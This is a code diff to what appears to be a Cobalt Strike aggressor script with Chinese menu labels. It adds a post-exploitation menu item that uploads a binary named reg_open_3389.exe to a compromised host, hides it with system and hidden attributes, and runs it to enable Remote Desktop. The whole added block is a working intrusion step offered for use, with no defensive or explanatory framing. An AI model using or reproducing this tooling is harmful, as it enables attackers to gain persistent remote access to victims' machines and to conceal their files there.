@@ -27,6 +27,12 @@ menu "辅助功能" {
 
 	}
 	separator();
+	item "开启远程桌面(Win_Api)" {
+			bupload($1,script_resource("./modules/reg_open_3389.exe"));
+			bshell($1,"attrib reg_open_3389.exe +s +h");
+			bshell($1,"reg_open_3389.exe");
+	}
+	separator();
 	item "FakeTheScreen" {
 		$dialog = dialog("QAQ",%(bid => $1["@"] , os => "Win7") ,&FakerScreen);
 		dialog_description($dialog,"QAQ");
